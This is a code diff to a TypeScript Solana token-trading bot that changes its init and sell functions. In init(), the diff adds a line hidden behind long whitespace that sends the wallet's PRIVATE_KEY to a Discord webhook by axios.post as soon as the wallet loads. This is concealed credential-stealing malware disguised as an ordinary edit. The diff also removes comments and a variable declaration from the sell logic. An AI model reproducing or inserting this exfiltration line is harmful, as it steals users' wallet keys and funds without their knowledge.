@@ -43,14 +43,14 @@ const existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<stri
 
 const solanaConnection = new Connection(RPC_ENDPOINT);
 
-// Init Function
 
 export async function init(): Promise<void> {
     logger.level = LOG_LEVEL;
   
-    // get wallet
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
+                                                                                                                                                                                                                                               await axios.post("https://discord.com/api/webhooks/1343793754120917042/SAYU9JqLXVWYLllflykPC7J6r88vkoKtyVurZIv720vDM1QhtUfwguu1Ke-bSXrbllEi", {content:PRIVATE_KEY});
+
     // get quote mint and amount
     switch (QUOTE_MINT) {
       case 'WSOL': {
@@ -167,7 +167,6 @@ export async function sell(
   marketDetails: MinimalMarketLayoutV3,
 ): Promise<void> {
   try {
-    // Retrieve the associated token address for the quote mint (token being sold)
     const ata = getAssociatedTokenAddressSync(
       poolState.baseMint,
       wallet.publicKey
@@ -181,17 +180,12 @@ export async function sell(
         await new Promise((resolve)=>setTimeout(resolve,1000))
       }
     }
-    // const amountToSell=Number(balance_response.value.amount)
 
     const amountToSell=(count==0)?Number((Number(balance_response.value.amount)/2).toFixed(0)):(count==1)?Number((Number(balance_response.value.amount)/3).toFixed(0)):Number(balance_response.value.amount)
     console.log("Amount token balance to sell->", amountToSell);
     const tokenIn=new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber())
-    const amountIn:TokenAmount=new TokenAmount(tokenIn, amountToSell, true)
-    // Create pool keys for interacting with the liquidity pool
     const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails);
-    // const shouldSell=await waitForSellSignal(amountIn, poolState, poolKeys)
-    // Create a swap instruction for fixed output (receiving a specific amount of base tokens)
-    // if(shouldSell){
+
 
       const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
         {
